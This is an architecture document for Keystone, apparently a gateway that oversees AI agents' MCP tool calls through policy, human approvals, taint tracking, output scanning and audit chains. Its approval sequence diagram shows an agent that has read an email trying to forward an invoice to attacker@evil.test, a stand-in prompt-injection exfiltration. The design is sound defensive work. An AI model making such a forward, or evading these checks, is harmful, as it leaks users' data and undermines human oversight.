# Architecture

What the code does today. The reasons for each choice are in [docs/adr/](adr/). The plan sections behind it (3.4 pipeline, 3.6 contracts, 3.7 data model) are in [PLAN.md](PLAN.md). Settings and ports are in the [runbook](runbook.md).

## Components

One process, `keystone serve`, holds the MCP endpoint, the admin API and the background tasks. Postgres is the record and Redis holds state that changes on every call.

```mermaid
flowchart LR
  agent["Agent or any MCP client"] -->|"MCP over HTTP, Bearer JWT"| gw
  console["Console (React)"] -->|"admin API, Bearer JWT"| adm
  idp[("OIDC provider, Keycloak locally")] -.->|"signing keys (JWKS)"| gw
  subgraph proc ["keystone serve (one process)"]
    gw["gateway: /mcp, pipeline, dispatch"]
    adm["admin: /admin/api/v1, CLI"]
    reg["registry: sync, pinning"]
    pol["policy: Cedar adapter"]
    apv["approvals"]
    dfn["defense: rules, classifier"]
    met["metering: limits, budgets, ledger"]
    aud["audit: chain writer"]
    gw --> reg
    gw --> pol
    gw --> apv
    gw --> dfn
    gw --> met
    gw --> aud
    adm --> apv
    adm --> aud
  end
  gw -->|"call plus injected credential"| up["Tool servers: mail, files, bank, web, echo (HTTP or stdio)"]
  gw -->|"code"| sbx["Sandbox container, no network"]
  proc -->|"audit rows, approvals, tools, ledger"| pg[("Postgres 16")]
  proc -->|"sessions, buckets, spend, approval channels"| rd[("Redis 7")]
  proc -.->|"OTLP traces, Prometheus metrics"| obs["Jaeger, Prometheus, Grafana"]
```

| Package | What it owns |
|---|---|
| `gateway/` | The MCP endpoint, the fixed pipeline of nine slots, dispatch to a tool server or the sandbox, session state, upstream health |
| `registry/` | Tool discovery and sync, hash pinning, quarantine |
| `identity/` | Token validation, principals, the encrypted credential vault |
| `policy/` | The Cedar adapter (fails closed), the policy store, `keystone policy test` |
| `approvals/` | Held calls, decisions, notifications, Keystone's own `await_approval` tool |
| `defense/` | Seven pattern rules, the classifier, the scanner, the tool description check |
| `sandbox/` | One container per call and the reaper |
| `metering/` | Token buckets, budgets, the spend ledger, the LLM proxy |
| `audit/` | The hash chain, redaction, verification, export |
| `admin/` | The admin API for the console and the `keystone` CLI |
| `core/` | The contracts every slot builds against ([plan section 3.6](PLAN.md)) |

## One call, through the nine slots

The slots run in this order for every `tools/call`. A refusal from slots 1 to 6 skips the rest, and the audit row is written in every case.

```mermaid
flowchart TD
  call["tools/call"] --> rl["1 rate limit: tenant, user, agent, tool buckets"]
  rl --> pin["2 pinning: tool unchanged and enabled"]
  pin --> bud["3 budget: spend checked before the call"]
  bud --> pol["4 policy: Cedar allow, deny or require approval"]
  pol --> apr["5 approval: hold until a person decides"]
  apr --> cred["6 credential: decrypt and add the upstream key"]
  cred --> disp["dispatch to tool server or sandbox"]
  disp --> scan["7 output scan: annotate, redact or withhold, taint at 0.85"]
  scan --> flags["8 session flags: add the tool's tags"]
  flags --> met["9 metering: book the cost"]
  met --> out["result to the agent"]
  rl & pin & bud & pol & apr & cred -.->|"refused: tool result with a KS_ code"| out
  out --> aud["audit row, written in a finally block"]
```

## Data model

Postgres tables, from [src/keystone/db/models.py](../src/keystone/db/models.py). Only the columns that carry meaning are drawn. All ids are text; a tool's key is its tenant and its exposed name.

```mermaid
erDiagram
  tenants ||--o{ upstreams : owns
  tenants ||--o{ tools : owns
  upstreams ||--o{ tools : serves
  upstreams ||--o{ credentials : "has keys"
  tenants ||--o{ sessions : opens
  sessions ||--o{ approvals : "holds calls"
  tenants ||--o{ audit_events : records
  tenants ||--o{ spend_ledger : books
  tenants ||--o{ budgets : limits
  tenants {
    text id PK
    text name
  }
  upstreams {
    text id PK
    text tenant_id FK
    text transport "http, stdio, container_stdio"
    text credential_mode "none, static, per_user"
    text status
  }
  tools {
    text tenant_id PK
    text name PK
    text upstream_id FK
    text risk
    text_array tags
    text description_hash
    text schema_hash
    text status "active, quarantined, disabled"
    text pending_description
  }
  credentials {
    text id PK
    text upstream_id FK
    text user_id "null means static"
    bytea ciphertext
    text key_id
  }
  sessions {
    text id PK "MCP session id"
    text tenant_id FK
    text user_id
    text_array final_flags
    bool tainted
  }
  approvals {
    text id PK
    text session_id FK
    text tool_name
    text args_digest
    bytea args_ciphertext
    text_array reasons
    text status "pending, approved, rejected, expired, consumed"
    timestamptz expires_at
  }
  audit_events {
    bigint seq PK
    text call_id
    text effect
    text outcome
    text args_digest
    float scan_score
    text prev_hash
    text hash
  }
  spend_ledger {
    text id PK
    text kind "tool, llm"
    numeric cost_usd
  }
  budgets {
    text id PK
    text scope "tenant, user, agent"
    text window "day, month"
    numeric limit_usd
  }
  policy_versions {
    text version PK "sha256 of the loaded files"
  }
```

`audit_events` is append only: the application's database role has INSERT and SELECT on it and nothing else ([ADR-0009](adr/0009-audit-chain.md)). `spend_ledger` is the source of truth for budgets, and Redis counters are rebuilt from it after a restart ([ADR-0014](adr/0014-redis-and-postgres.md)). `policy_versions` records every policy set that was loaded, and each audit row names the version that decided it. The approvals table is outside the audit chain, and the application role can change it.

## Redis keys

| Key | Type | Lifetime | Written by |
|---|---|---|---|
| `ks:sess:{session_id}` | hash: principal, taint, call count, spend, one field per flag | 24 h, restarted by each read and change | the session store; changes are Lua scripts, so a late write adds flags and never removes one ([ADR-0015](adr/0015-session-merges.md)) |
| `ks:rl:{scope}:{id}` | token bucket | per bucket | the rate limiter |
| `ks:spend:{tenant}:{scope}:{scope_id}:{window_start}` | counter | the window and a day more | the budget check, raised to the ledger's total |
| `ks:approvals:{tenant}` | pub/sub channel | none | new approval requests, for the console |
| `ks:approval:{id}` | pub/sub channel | none | the decision on one request |
| `ks:policy:listcache:{principal_hash}:{version}` | tool name set | 60 s | the tool list filter |

With no `KEYSTONE_REDIS_URL` the gateway keeps sessions and buckets in memory, which is for tests and a single process.

## One call that needs an approval

A forward of an invoice to an outside address, after the session read an email. The agent's first call is held; it waits, and the approval is bound to the digest of the arguments.

```mermaid
sequenceDiagram
  autonumber
  participant A as Agent
  participant K as Keystone pipeline
  participant R as Redis
  participant P as Postgres
  participant C as Console
  participant M as Mail server
  A->>K: tools/call mail__send_email (to attacker@evil.test)
  K->>K: rate limit, pinning, budget pass
  K->>R: read session flags and taint
  K->>K: Cedar: rule-of-two, tainted-external-effect asks
  K->>P: insert approval (pending), digest of arguments, encrypted arguments
  K->>R: publish on ks:approvals:{tenant}
  R-->>C: new request
  K-->>A: held for approvals.wait_seconds (60 s by default)
  C->>P: approver rejects, or approves (UPDATE with digest, tool, tenant, session, user, status, expiry)
  P-->>K: decision (ks:approval:{id})
  alt approved and the digest still matches
    K->>P: consume the approval, once
    K->>K: credential slot adds the upstream key
    K->>M: tools/call with the injected credential
    M-->>K: result
    K->>K: scan output, add flags, book cost
    K-->>A: result
  else rejected
    K-->>A: KS_APPROVAL_REJECTED as a tool result, with the note
  else nobody decides in time
    K-->>A: KS_APPROVAL_PENDING with the id, then keystone__await_approval
  end
  K->>P: audit row (always, hash-chained)
```

The requester cannot approve their own call. A call that waited is checked again against pinning, budget and policy before its approval is used, so a tool quarantined during the wait is not called ([ADR-0010](adr/0010-approvals.md)).
